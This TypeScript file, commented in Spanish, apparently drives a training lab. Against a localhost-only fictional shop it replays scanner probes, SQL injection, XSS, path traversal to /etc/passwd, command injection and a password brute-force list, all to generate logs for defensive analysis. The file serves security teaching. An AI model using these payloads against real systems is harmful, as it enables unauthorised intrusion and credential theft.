/**
 * Simulador de ataques del laboratorio. Lanza peticiones HTTP reales contra la tienda
 * ficticia, imitando lo que hacen herramientas como Nikto, sqlmap o Hydra.
 *
 * Por seguridad SOLO acepta objetivos en 127.0.0.1 / localhost: no se puede apuntar
 * a ninguna web de fuera. Todas las peticiones salen de tu ordenador; para representar
 * atacantes distintos se envía la cabecera X-Forwarded-For con IPs de documentación (RFC 5737).
 */

const BROWSER = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36';
const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

function assertLocal(base: string): URL {
    const url = new URL(base);
    if (!['127.0.0.1', 'localhost', '[::1]'].includes(url.hostname)) {
        throw new Error(`El simulador solo puede atacar al laboratorio local, no a ${url.hostname}.`);
    }
    return url;
}

async function hit(base: URL, path: string, ip: string, ua = BROWSER, init: RequestInit = {}) {
    try {
        const response = await fetch(new URL(path, base), {
            redirect: 'manual',
            ...init,
            headers: { 'user-agent': ua, 'x-forwarded-for': ip, ...(init.headers ?? {}) },
        });
        await response.arrayBuffer();
    } catch {
        // Si la tienda no responde a una petición concreta, seguimos con la siguiente.
    }
}

/** Visitas normales de clientes, para que el ataque no ocurra sobre un log vacío. */
async function normalTraffic(base: URL, count: number, delay: number) {
    const pages = ['/', '/productos?id=1', '/productos?id=3', '/buscar?q=kenia', '/productos?id=2', '/css/main.css', '/descargas?file=catalogo-2026.pdf', '/favicon.ico'];
    for (let i = 0; i < count; i++) {
        await hit(base, pages[i % pages.length], `203.0.113.${10 + ((i * 7) % 30)}`);
        await sleep(delay);
    }
}

export async function runAttackScenario(target: string, announce: (text: string) => void): Promise<void> {
    const base = assertLocal(target);
    const total = 7;
    const phase = (n: number, text: string) => announce(`Fase ${n} de ${total} · ${text}`);

    phase(1, 'Tráfico normal: clientes visitando la tienda');
    await normalTraffic(base, 14, 350);

    phase(2, 'Reconocimiento: escaneo con Nikto desde 198.51.100.200');
    const NIKTO = 'Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:007153)';
    const words = ['admin', 'administrator', 'wp-admin', 'wp-login.php', 'old', 'test', 'dev', 'backup', 'backups', 'db', 'uploads',
        'private', 'config', 'install', 'setup.php', 'info.php', 'phpinfo.php', 'shell.php', 'upload.php', 'temp', 'logs', 'debug',
        'portal', 'cpanel', 'webadmin', 'console', 'api', 'staging', 'manager/html', 'server-info', 'readme.html'];
    for (const word of words) {
        await hit(base, `/${word}`, '198.51.100.200', NIKTO);
        await sleep(90);
    }
    for (const path of ['/.env', '/.git/config', '/backup.sql', '/phpmyadmin/']) {
        await hit(base, path, '198.51.100.200', NIKTO);
        await sleep(150);
    }

    phase(3, 'Inyección SQL con sqlmap desde 203.0.113.99');
    const SQLMAP = 'sqlmap/1.8.4#stable (https://sqlmap.org)';
    for (const payload of [
        "1'",
        "1' OR '1'='1",
        '1 UNION ALL SELECT NULL,NULL,version()-- -',
        '1 AND SLEEP(5)',
        '-1 UNION SELECT table_name FROM information_schema.tables',
    ]) {
        await hit(base, `/productos?id=${encodeURIComponent(payload)}`, '203.0.113.99', SQLMAP);
        await sleep(700);
    }
    await normalTraffic(base, 4, 300);

    phase(4, 'Cross-Site Scripting en el buscador desde 198.51.100.61');
    for (const payload of ['<script>alert(document.cookie)</script>', '<img src=x onerror=alert(1)>']) {
        await hit(base, `/buscar?q=${encodeURIComponent(payload)}`, '198.51.100.61');
        await sleep(900);
    }

    phase(5, 'Path traversal: intento de leer /etc/passwd desde 192.0.2.150');
    for (const file of ['../../../../etc/passwd', '..%2F..%2F..%2Fetc%2Fpasswd', 'php://filter/convert.base64-encode/resource=index.php']) {
        await hit(base, `/descargas?file=${file.includes('%') ? file : encodeURIComponent(file)}`, '192.0.2.150');
        await sleep(800);
    }

    phase(6, 'Inyección de comandos desde 203.0.113.140');
    for (const payload of ['127.0.0.1;cat /etc/passwd', '127.0.0.1|whoami']) {
        await hit(base, `/tools/ping?host=${encodeURIComponent(payload)}`, '203.0.113.140', 'curl/8.5.0');
        await sleep(900);
    }
    await normalTraffic(base, 4, 300);

    phase(7, 'Fuerza bruta contra el login de empleados desde 192.0.2.77');
    const HYDRA = 'Mozilla/4.0 (Hydra)';
    const passwords = ['123456', 'password', 'admin', 'admin123', 'qwerty', 'cafe', 'aurora', 'aurora1', 'aurora123', 'cafeaurora',
        'Aurora2025', 'aurora2025', 'welcome1', 'letmein', 'aurora2026'];
    for (const password of passwords) {
        await hit(base, '/login', '192.0.2.77', HYDRA, {
            method: 'POST',
            headers: { 'content-type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ user: 'admin', password }).toString(),
        });
        await sleep(450);
    }
    await hit(base, '/panel', '192.0.2.77', HYDRA);

    announce('Simulación terminada. Pulsa «Ver informe» para ver el análisis completo.');
}
